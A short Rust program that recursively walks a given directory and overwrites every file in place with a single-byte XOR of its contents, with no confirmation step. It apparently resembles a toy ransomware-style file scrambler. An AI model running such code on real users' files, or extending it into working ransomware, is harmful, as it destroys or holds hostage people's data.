use std::fs;
use std::env;
use std::os::unix::prelude::FileExt;
use std::path::Path;
use std::io;

const BUF_SIZE: usize = 4096 * 256; // 1 MiB

/**
  Xor each byte in the buffer with the given key
 */
fn xor_buffer(buffer: &mut [u8], key: u8) {
    for byte in buffer.iter_mut() {
        *byte ^= key;
    }
}

/**
  Encrypt regular file using given key and buffer.
 */
fn encrypt_file(path: &Path, key: u8, buffer: &mut Vec<u8>) -> io::Result<()> {
    let buf_size = buffer.len();
    let file = fs::File::options()
        .read(true)
        .write(true)
        .open(path)?;
    let attr = file.metadata()?;
    let full_buffer_rw_count = (attr.len() as usize ) / buf_size;
    let last_rw_size = (attr.len() as usize) % buf_size;
    for i in 0..full_buffer_rw_count {
        let offset = (i * buf_size) as u64;
        file.read_exact_at(buffer.as_mut_slice(), offset)?;
        xor_buffer(buffer, key);
        file.write_all_at(buffer.as_mut_slice(), offset)?;
    }
    if last_rw_size > 0 {
        let offset = (full_buffer_rw_count * buf_size) as u64;
        file.read_exact_at(&mut buffer[0..last_rw_size], offset)?;
        xor_buffer(&mut buffer[0..last_rw_size], key);
        file.write_all_at(&mut buffer[0..last_rw_size], offset)?;
    }
    file.sync_data()?;
    Ok(())
}

fn encrypt_dir(path: &Path, key: u8, buffer: &mut Vec<u8>) -> io::Result<()> {
    let iterator = fs::read_dir(path)?;
    for record in iterator {
        let entry = record?;
        let entry_path = entry.path();
        let entry_meta = entry.metadata()?;
        if entry_meta.is_dir() {
            encrypt_dir(entry_path.as_path(), key, buffer)?;
        } else if entry_meta.is_file() {
            encrypt_file(entry_path.as_path(), key, buffer)?;
        }
    }
    Ok(())
}

fn main() {
    let argv: Vec<String> = env::args().collect();
    if argv.len() != 2 {
        println!("Usage: {} path/to/directory", argv[0]);
        return;
    }
    let path = Path::new(&argv[1]);
    let attrs = fs::metadata(&path);
    let _attrs = match attrs {
        Ok(val) => val,
        Err(_) => {
            println!("Cannot access filesystem of file {} possibly does not exist", path.display());
            return;
        }
    };
    let mut buf: Vec<u8> = Vec::with_capacity(BUF_SIZE);
    buf.resize(BUF_SIZE, 0);
    if let Err(err) = encrypt_dir(&path, 0x66, &mut buf) {
        eprintln!("{} error: {}", err.kind(), err.to_string());
    }
}
